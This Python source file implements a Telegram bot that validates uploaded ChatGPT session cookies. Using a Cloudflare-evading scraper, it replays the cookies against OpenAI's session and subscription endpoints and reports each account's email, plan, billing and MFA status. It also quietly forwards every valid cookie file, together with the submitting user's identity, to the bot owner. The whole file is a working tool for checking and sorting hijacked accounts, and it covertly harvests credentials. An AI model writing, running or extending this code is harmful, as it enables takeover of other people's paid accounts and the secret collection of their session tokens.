#!/usr/bin/env python3
import os
import sys
import json
import logging
import cloudscraper
import asyncio
import zipfile
from io import BytesIO
from datetime import datetime, timezone
from http.cookiejar import MozillaCookieJar, Cookie
from pathlib import Path
from dotenv import load_dotenv
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputFile,
)
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    filters,
)

# ─── Configuration & Setup ─────────────────────────────────────────────────────

load_dotenv()
TELEGRAM_TOKEN      = os.getenv("TELEGRAM_TOKEN")
OWNER_CHAT_ID       = os.getenv("OWNER_CHAT_ID")
CHANNEL_CHAT_ID     = os.getenv("CHANNEL_CHAT_ID")
CHANNEL_INVITE_LINK = os.getenv("CHANNEL_INVITE_LINK")

if not (TELEGRAM_TOKEN and OWNER_CHAT_ID and CHANNEL_CHAT_ID and CHANNEL_INVITE_LINK):
    logging.error("Please set TELEGRAM_TOKEN, OWNER_CHAT_ID, CHANNEL_CHAT_ID, and CHANNEL_INVITE_LINK in .env")
    sys.exit(1)
try:
    OWNER_CHAT_ID   = int(OWNER_CHAT_ID)
    CHANNEL_CHAT_ID = int(CHANNEL_CHAT_ID)
except ValueError:
    logging.error("OWNER_CHAT_ID and CHANNEL_CHAT_ID must be integers")
    sys.exit(1)

ALLOWED_EXTENSIONS = {".txt", ".json", ".zip"}
USER_AGENT         = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
)
HEADERS = {
    "User-Agent": USER_AGENT,
    "Referer":    "https://chat.openai.com/auth/login",
}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── Cookie Parsing & Conversion ───────────────────────────────────────────────

def parse_cookie_file(file_content: str) -> MozillaCookieJar | None:
    jar = MozillaCookieJar()
    now = int(datetime.now(timezone.utc).timestamp())
    for line in file_content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) < 7:
            continue
        domain, flag, path, secure, expiry, name, value = parts
        try:
            exp_ts = int(float(expiry))
            if exp_ts < now:
                continue
            c = Cookie(
                version=0, name=name, value=value,
                port=None, port_specified=False,
                domain=domain, domain_specified=bool(domain),
                domain_initial_dot=domain.startswith("."),
                path=path, path_specified=True,
                secure=(secure.upper()=="TRUE"),
                expires=exp_ts,
                discard=False, comment=None, comment_url=None,
                rest={}, rfc2109=False
            )
            jar.set_cookie(c)
        except ValueError:
            continue
    return jar if jar else None

def json_to_netscape_cookie(js: dict) -> str | None:
    domain = js.get("domain","")
    flag   = "TRUE" if domain.startswith(".") else "FALSE"
    path   = js.get("path","/")
    secure = "TRUE" if js.get("secure",False) else "FALSE"
    expiry = int(js.get("expirationDate",0))
    name   = js.get("name","")
    value  = js.get("value","")
    if not (name and value):
        return None
    return f"{domain}\t{flag}\t{path}\t{secure}\t{expiry}\t{name}\t{value}"

def format_expiry_date(iso: str) -> str | None:
    for fmt in ("%Y-%m-%dT%H:%M:%S.%fZ","%Y-%m-%dT%H:%M:%SZ"):
        try:
            return datetime.strptime(iso, fmt).strftime("%d-%m-%Y")
        except Exception:
            continue
    return None

def get_cookie_hash(jar: MozillaCookieJar) -> int:
    s = "".join(f"{c.name}:{c.value}:{c.domain}:{c.path}"
                for c in sorted(jar, key=lambda c: (c.name,c.value)))
    return hash(s)

# ─── Subscription Check ────────────────────────────────────────────────────────

def check_cookie(jar: MozillaCookieJar) -> tuple[dict,int]:
    scraper = cloudscraper.create_scraper(browser={"custom":USER_AGENT})
    scraper.cookies = jar
    result = {"status":"failed","details":{}}
    ck_hash = get_cookie_hash(jar)

    try:
        # 1) /api/auth/session
        r1 = scraper.get(
            "https://chat.openai.com/api/auth/session",
            headers=HEADERS, timeout=10
        )
        if r1.status_code == 403:
            result["details"]["error"] = "403 Forbidden"
            return result, ck_hash

        data = r1.json() if "application/json" in r1.headers.get("Content-Type","") else {}
        if "accessToken" not in data:
            result["details"]["error"] = "no accessToken"
            return result, ck_hash

        token = data["accessToken"]
        acct  = data.get("account",{}).get("id")
        if not acct:
            result["details"]["error"] = "no account_id"
            return result, ck_hash

        # 2) /backend-api/subscriptions
        headers2 = {
            **HEADERS,
            "Authorization": f"Bearer {token}",
            "Referer":      "https://chatgpt.com/",
        }
        r2 = scraper.get(
            f"https://chatgpt.com/backend-api/subscriptions?account_id={acct}",
            headers=headers2, timeout=10
        )
        if r2.status_code != 200:
            result["details"]["error"] = f"subs HTTP {r2.status_code}"
            return result, ck_hash

        sd   = r2.json()
        plan = sd.get("plan_type","free")
        delin= sd.get("is_delinquent",True)
        until= sd.get("active_until")
        exp  = format_expiry_date(until) if until else None
        email= data.get("user",{}).get("email")

        result["details"].update({
            "plan":             plan,
            "billing_period":   sd.get("billing_period"),
            "will_renew":       sd.get("will_renew"),
            "billing_currency": sd.get("billing_currency"),
            "expiry_date":      exp,
            "email":            email,
            "mfa":              data.get("user",{}).get("mfa",False),
        })

        if plan in ("pro","plus","team","enterprise") and not delin and exp:
            result["status"] = "success"
        elif plan == "free" or not exp:
            result["status"] = "custom"

    except Exception as e:
        result["details"]["error"] = str(e)

    return result, ck_hash

# ─── Per‐File Processing ───────────────────────────────────────────────────────

async def process_one_file(
    chat_id:int,
    message_id:int,
    filename:str,
    content:bytes,
    ext:str,
    user_id:int,
    full_name:str,
    username_str:str,
    context:ContextTypes.DEFAULT_TYPE
):
    # decode
    try:
        text = content.decode("utf-8")
    except:
        await context.bot.send_message(
            chat_id,
            f"❌ Cannot decode `{filename}`",
            reply_to_message_id=message_id
        )
        return

    # build jar
    jar = None
    if ext == ".json" or text.lstrip().startswith("["):
        try:
            arr = json.loads(text)
            lines = ["# Netscape HTTP Cookie File"]
            for c in arr:
                ln = json_to_netscape_cookie(c)
                if ln: lines.append(ln)
            jar = parse_cookie_file("\n".join(lines))
        except:
            jar = None
    else:
        jar = parse_cookie_file(text)

    # fallback k=v;…
    if not jar:
        cookies_map = {}
        for pair in text.split(";"):
            if "=" in pair:
                k,v = pair.split("=",1)
                cookies_map[k.strip()] = v.strip()
        if cookies_map:
            lines = ["# Netscape HTTP Cookie File"]
            for name,val in cookies_map.items():
                lines.append(f".openai.com\tTRUE\t/\tFALSE\t0\t{name}\t{val}")
            jar = parse_cookie_file("\n".join(lines))

    if not jar:
        await context.bot.send_message(
            chat_id,
            "⚠️ unsupported cookie format, message Dev @noonXD to add this format",
            reply_to_message_id=message_id
        )
        return

    # check
    loop = asyncio.get_running_loop()
    res, _ = await loop.run_in_executor(None, check_cookie, jar)
    d = res["details"]
    bot_user = (await context.bot.get_me()).username

    # decide plan
    if res["status"] == "success":
        raw_plan = d["plan"]
    elif res["status"] == "custom":
        raw_plan = "free"
        # clear out billing info on free
        d["billing_period"]   = None
        d["billing_currency"] = None
    else:
        await context.bot.send_message(
            chat_id,
            "❌ Invalid or not working cookie",
            reply_to_message_id=message_id
        )
        return

    # Title‐case & warn on free
    if raw_plan.lower() == "free":
        plan_display = "Free ⚠️"
    else:
        plan_display = raw_plan.capitalize()

    billing_period = d.get("billing_period")
    if billing_period:
        billing_period = billing_period.capitalize()
    billing_currency = d.get("billing_currency")
    if billing_currency:
        billing_currency = billing_currency.upper()

    # caption
    caption = (
        f"✅ this cookie is valid, checked by @{bot_user}\n\n"
        f"Account information:\n"
        f"📧Mail: {d.get('email','N/A')}\n"
        f"📦Plan: {plan_display}\n"
        f"⏳Expires on: {d.get('expiry_date','N/A')}\n"
        f"💳Billing Period: {billing_period}\n"
        f"💫Will Renew: {d.get('will_renew')}\n"
        f"💸Billing Currency: {billing_currency}\n"
        f"🔒MFA: {d.get('mfa')}"
    )
    new_name = f"{bot_user}-{message_id}{ext}"
    buf = BytesIO(content); buf.name=new_name; buf.seek(0)

    # reply user
    await context.bot.send_document(
        chat_id,
        document=InputFile(buf, filename=new_name),
        caption=caption,
        reply_to_message_id=message_id
    )

    # owner
    owner_caption = (
        f"Chat ID: <a href=\"tg://user?id={user_id}\">{user_id}</a>\n"
        f"Full name: {full_name}\n"
        f"Username: {username_str}\n\n"
        "Account information:\n"
        f"📧Mail: {d.get('email','N/A')}\n"
        f"📦Plan: {plan_display}\n"
        f"⏳Expires on: {d.get('expiry_date','N/A')}\n"
        f"💳Billing Period: {billing_period}\n"
        f"💫Will Renew: {d.get('will_renew')}\n"
        f"💸Billing Currency: {billing_currency}\n"
        f"🔒MFA: {d.get('mfa')}"
    )
    buf2 = BytesIO(content); buf2.name=new_name; buf2.seek(0)
    await context.bot.send_document(
        OWNER_CHAT_ID,
        document=InputFile(buf2, filename=new_name),
        caption=owner_caption,
        parse_mode="HTML"
    )

# ─── Handlers ────────────────────────────────────────────────────────────────

async def enforce_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user = update.message.from_user
    full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
    try:
        m = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user.id)
        if m.status in ("member","administrator","creator"):
            return True
    except:
        pass

    kb = [[InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_INVITE_LINK)]]
    await update.message.reply_text(
        f"👋 Hi {full_name}! Please join our channel to use this bot.",
        reply_markup=InlineKeyboardMarkup(kb),
        reply_to_message_id=update.message.message_id
    )
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
    if not await enforce_join(update, context):
        return
    await update.message.reply_text(
        f"👋 Hi {full_name}! Send me your ChatGPT‐cookies file(s) (.txt, .json, or .zip), and I’ll check whether they’re still valid.",
        reply_to_message_id=update.message.message_id
    )

async def handle_document(update: Update, context:ContextTypes.DEFAULT_TYPE):
    if not await enforce_join(update, context):
        return

    doc = update.message.document
    fn  = doc.file_name
    ext = Path(fn).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        await update.message.reply_text(
            "❌ Only .txt, .json or .zip allowed",
            reply_to_message_id=update.message.message_id
        )
        return

    data = await (await doc.get_file()).download_as_bytearray()
    user = update.message.from_user
    full_name    = f"{user.first_name or ''}{(' '+user.last_name) if user.last_name else ''}"
    username_str = f"@{user.username}" if user.username else "N/A"

    if ext in (".txt", ".json"):
        context.application.create_task(
            process_one_file(
                update.effective_chat.id,
                update.message.message_id,
                fn, bytes(data), ext,
                user.id, full_name, username_str, context
            )
        )
    else:
        buf = BytesIO(data)
        with zipfile.ZipFile(buf) as zf:
            for zi in zf.infolist():
                if zi.filename.lower().endswith((".txt",".json")):
                    content = zf.read(zi)
                    context.application.create_task(
                        process_one_file(
                            update.effective_chat.id,
                            update.message.message_id,
                            Path(zi.filename).name,
                            content,
                            Path(zi.filename).suffix.lower(),
                            user.id, full_name, username_str, context
                        )
                    )

def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.run_polling()

if __name__ == "__main__":
    main()
